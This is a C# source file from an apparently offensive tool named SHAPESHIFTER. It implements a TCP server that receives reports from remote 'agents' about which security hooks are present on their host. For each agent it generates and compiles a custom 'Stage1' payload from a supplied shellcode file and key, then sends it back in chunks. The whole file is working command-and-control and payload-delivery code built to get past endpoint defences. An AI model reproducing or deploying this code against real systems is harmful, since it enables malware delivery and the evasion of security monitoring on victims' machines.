﻿using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;


namespace SHAPESHIFTER
{
    class TcpServer
    {
        public static void ServerInit(string address, int port, string shellcodeFile, string key)
        {
            IPAddress ip = null;
            try
            {
                if (address == "127.0.0.1") ip = IPAddress.Any;
                else ip = IPAddress.Parse(address);
            }
            catch (FormatException fx)
            {
                Console.WriteLine(fx.Message);
            }

            TcpListener server = null;
            try
            {
                server = new TcpListener(ip, port);

                // Size of buffer we're expecting to receive
                byte[] bytes = new byte[19];


                server.Start();
                Console.Write("[>] Server started on {0}:{1}...\n", ip, port);
                while (true)
                {
                    // Perform a blocking call to accept requests.
                    TcpClient client = server.AcceptTcpClient();
                    Guid clientId = Guid.NewGuid();
                    Console.WriteLine("\n[+] New connection from {0} (ID: {1})", 
                        ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString(), clientId.ToString());

                    // Get a stream object for reading and writing
                    NetworkStream stream = client.GetStream();

                    int i;

                    // Loop to receive all the data sent by the client.
                    while ((i = stream.Read(bytes, 0, bytes.Length)) != 0)
                    {
                        IList<string> hooks = Helpers.ResultsParser(bytes);
                        if (hooks.Count != 0)
                        {
                            foreach(string hook in hooks)
                            {
                                Console.WriteLine("  [!] Hook detected on {0}!", hook.PadLeft(4));
                            }
                        }

                        if (!Compiler.BuildStage1(hooks, shellcodeFile, clientId.ToString(),key))
                        {
                            Console.WriteLine("  [-] Failed to generate Stage1 source file");
                            break;
                        }

                        byte[] stage1 = Compiler.CompileStage1(clientId.ToString());
                        if (stage1 == null)
                        {
                            Console.WriteLine("  [-] Failed to compile Stage1");
                            break;
                        }

                        //byte[] msg = System.Text.Encoding.ASCII.GetBytes(data);

                        // Send back a response.
                        //stream.Write(stage1, 0, stage1.Length);
                        //Console.WriteLine("  [>] Sent {0} bytes back to the agent", stage1.Length);
                        int stageSize = stage1.Length;
                        int chunkCount = (stageSize + 999) / 1000;
                        Console.WriteLine("  [>] Sending total of {0} bytes to the agent...", stageSize);
                        for (int j = 0; j < chunkCount; j++)
                        {
                            stream.Write(Helpers.BufferSplit(stage1, 1000)[j], 0, Helpers.BufferSplit(stage1, 1000)[j].Length);
                            Console.WriteLine("  [>] Sent {0} bytes back to the agent", Helpers.BufferSplit(stage1, 1000)[j].Length);
                        }
                    }

                    // Shutdown and end connection 
                    client.Close();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Server Error: {0}", ex.Message);
                return;
            }
            finally
            {
                server.Stop();
            }
        }
    }
}
